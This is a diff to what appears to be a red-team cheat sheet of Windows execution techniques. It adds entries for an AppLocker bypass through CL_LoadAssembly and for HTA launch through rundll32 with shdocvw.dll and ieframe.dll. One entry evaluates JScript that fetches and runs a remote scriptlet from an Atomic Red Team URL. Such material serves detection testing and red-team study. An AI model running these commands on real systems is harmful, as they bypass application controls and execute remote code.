@@ -115,8 +115,26 @@ $s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolve
 
 ```
 
-( 18 )SCT Launch Execution Reflection.Assembly Via ( Microsoft.JScript )
+( 18 ) SCT Launch Execution Reflection.Assembly Via ( Microsoft.JScript )
 ```
 [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct …").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
 ```
 
+( 19 ) Commandline APT Launch Execution Applocker/Bypassing Via ( CL_LoadAssembly )
+
+```
+import-module C:\windows\diagnostics\system\AERO\CL_LoadAssembly.ps1
+LoadAssemblyFromPath C:\Windows\System32\calc.exe
+```
+
+( 20 ) HTA Launch Execution Via ( shdocvw.dll ) 
+
+```
+rundll32.exe shdocvw.dll, OpenURL <path to local URL file>
+```
+
+( 21 ) HTA Launch Execution Via ( ieframe.dll ) 
+
+```
+rundll32.exe ieframe.dll, OpenURL <path to local URL file>
+```
